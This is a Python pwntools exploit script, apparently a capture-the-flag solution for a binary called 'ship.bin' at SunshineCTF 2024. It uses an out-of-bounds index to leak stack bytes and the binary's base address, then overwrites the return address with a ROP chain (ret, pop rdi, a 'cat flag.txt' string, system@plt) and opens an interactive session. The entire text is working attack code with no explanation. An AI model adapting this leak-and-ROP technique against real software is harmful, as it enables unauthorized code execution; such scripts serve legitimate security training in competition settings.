#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./ship.bin")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("2024.sunshinectf.games", 24003)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def read64(offset_from_rbp: int) -> int:
        result = 0
        for i in range(8):
            io.sendlineafter(b">>> ", str(-1).encode())
            io.sendlineafter(b">>> ", str(16 + 0x210 + offset_from_rbp + i).encode())
            io.sendlineafter(b">>> ", b"\x00")
            io.recvuntil(b"from ")
            leak = io.recvuntil(b" to").strip(b" to")
            result += int(leak, 16) << (i * 8)
            continue
        return result

    def write64(offset_from_rbp: int, data: int):
        for i in range(len(ptr.p64(data))):
            io.sendlineafter(b">>> ", str(-1).encode())
            io.sendlineafter(b">>> ", str(16 + 0x210 + offset_from_rbp + i).encode())
            io.sendlineafter(b">>> ", ptr.p8(ptr.p64(data)[i]))
            continue

    exe.base = read64(0xE0) - 0x10D0

    ret = next(exe.gadget("ret;"))
    pop_rdi = next(exe.gadget("pop rdi; ret;"))
    cat_flag = next(exe.find("cat flag.txt"))
    system_plt = unwrap(exe.plt("system"))

    print("hello")
    write64(0x8, ret)
    print("hello")
    write64(0x10, pop_rdi)
    print("hello")
    write64(0x18, cat_flag)
    print("hello")
    write64(0x20, system_plt)

    io.sendlineafter(b">>> ", str(-1).encode())
    io.sendlineafter(b">>> ", str(16 + 0x210 - 4).encode())
    io.sendlineafter(b">>> ", b"1")

    io.interactive()
    return


if __name__ == "__main__":
    main()
